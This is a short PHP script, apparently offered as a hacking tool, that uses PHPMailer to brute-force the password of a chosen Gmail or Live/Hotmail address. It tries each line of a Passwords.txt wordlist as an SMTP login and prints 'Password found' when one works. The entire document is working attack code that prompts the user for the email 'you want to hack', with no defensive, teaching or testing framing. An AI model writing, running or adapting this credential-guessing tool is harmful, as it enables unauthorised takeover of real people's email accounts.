<?php

require './PHPMailer-master/PHPMailerAutoload.php';
$mail = new PHPMailer;

$handle = fopen("php://stdin", "r");
echo "1. Gmail\n2. Live/Hotmail\n";
echo "Enter which mail you want to hack : ";
$line = trim(fgets($handle));

$mail->isSMTP();
$mail->SMTPAuth = true;
$mail->SMTPSecure = 'tls';
$mail->SMTPDebug = 1;
$mail->Port = 587;
if ($line == 1) {
    $mail->Host = 'smtp.gmail.com';
} else if ($line == 2) {
    $mail->Host = 'smtp.live.com';
} else {
    echo "Sorry, wrong choice.\n";
    exit;
}
echo "Enter the email you want to hack : ";
$username = trim(fgets($handle));

$fh = fopen("Passwords.txt", "r");
while (!feof($fh)) {
    $password = trim(fgets($fh));
    $mail->Username = $username;
    $mail->Password = $password;
    if ($mail->smtpConnect()) {
        echo "***************************\n";
        echo "Password found : $password\n";
        echo "***************************\n";
        exit;
    } else {
        echo "Failed with password $password\n";
    }
}
